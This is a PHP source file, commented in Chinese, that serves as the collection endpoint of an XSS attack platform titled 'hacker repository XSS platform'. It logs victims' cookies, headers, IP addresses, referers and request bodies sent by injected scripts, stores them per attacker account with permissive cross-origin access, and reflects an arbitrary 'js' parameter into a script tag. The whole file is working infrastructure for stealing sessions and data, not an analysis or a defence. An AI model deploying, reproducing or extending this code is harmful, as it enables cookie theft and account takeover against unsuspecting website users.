<?php
/**
 * XSS数据接收端点 - 主入口
 */

// 错误日志
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/data/index_errors.log');

require_once __DIR__ . '/config.php';

// 允许跨域
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// 生成唯一ID
function generateUuid() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

// 获取客户端IP
function getClientIpAddr() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
        return $_SERVER['HTTP_X_REAL_IP'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// 收集访问者信息
$visitorData = [
    'log_id' => generateUuid(),
    'ip' => getClientIpAddr(),
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'referer' => $_SERVER['HTTP_REFERER'] ?? '',
    'url' => (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}",
    'method' => $_SERVER['REQUEST_METHOD'],
    'endpoint' => '/',
    'cookies' => json_encode($_COOKIE),
    'headers' => json_encode(getallheaders() ?: []),
    'content_type' => $_SERVER['CONTENT_TYPE'] ?? '',
    'created_at' => date('Y-m-d H:i:s')
];

// 从URL参数中获取用户ID（用于多用户数据隔离）
$userId = isset($_GET['uid']) ? (int)$_GET['uid'] : null;
if ($userId && $userId > 0) {
    $visitorData['user_id'] = $userId;
} else {
    $visitorData['user_id'] = null; // 未指定用户ID的日志只有管理员能看到
}

// 获取请求数据
$requestData = [];
$rawData = '';

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $requestData = $_GET;
    $visitorData['data_type'] = 'query_params';
    $rawData = http_build_query($_GET);
} elseif (in_array($_SERVER['REQUEST_METHOD'], ['POST', 'PUT', 'PATCH'])) {
    $rawData = file_get_contents('php://input');
    $contentType = strtolower($_SERVER['CONTENT_TYPE'] ?? '');
    
    if (strpos($contentType, 'application/json') !== false) {
        $requestData = json_decode($rawData, true);
        if (json_last_error() !== JSON_ERROR_NONE) {
            error_log('JSON decode error: ' . json_last_error_msg());
            $requestData = ['raw' => $rawData, 'error' => json_last_error_msg()];
        }
        $visitorData['data_type'] = 'json';
    } elseif (strpos($contentType, 'application/x-www-form-urlencoded') !== false) {
        $requestData = $_POST;
        $visitorData['data_type'] = 'form';
    } else {
        $requestData = ['raw' => $rawData];
        $visitorData['data_type'] = 'raw';
    }
}

$visitorData['data'] = json_encode($requestData, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
$visitorData['raw_data'] = $rawData;

// 保存到数据库
try {
    $pdo = getDbConnection();
    $stmt = $pdo->prepare("
        INSERT INTO logs 
        (log_id, user_id, ip, user_agent, referer, url, method, endpoint, cookies, headers, data, data_type, raw_data, content_type, created_at) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ");
    
    $stmt->execute([
        $visitorData['log_id'],
        $visitorData['user_id'],
        $visitorData['ip'],
        $visitorData['user_agent'],
        $visitorData['referer'],
        $visitorData['url'],
        $visitorData['method'],
        $visitorData['endpoint'],
        $visitorData['cookies'],
        $visitorData['headers'],
        $visitorData['data'],
        $visitorData['data_type'],
        $visitorData['raw_data'],
        $visitorData['content_type'],
        $visitorData['created_at']
    ]);
} catch (PDOException $e) {
    error_log("保存日志失败: " . $e->getMessage());
}

// 返回响应
$jsPayload = $_GET['js'] ?? '';
if ($jsPayload) {
    echo "<!DOCTYPE html>
<html>
<head><title>黑客仓库XSS平台</title></head>
<body>
<script>
{$jsPayload}
</script>
</body>
</html>";
} else {
    http_response_code(200);
}
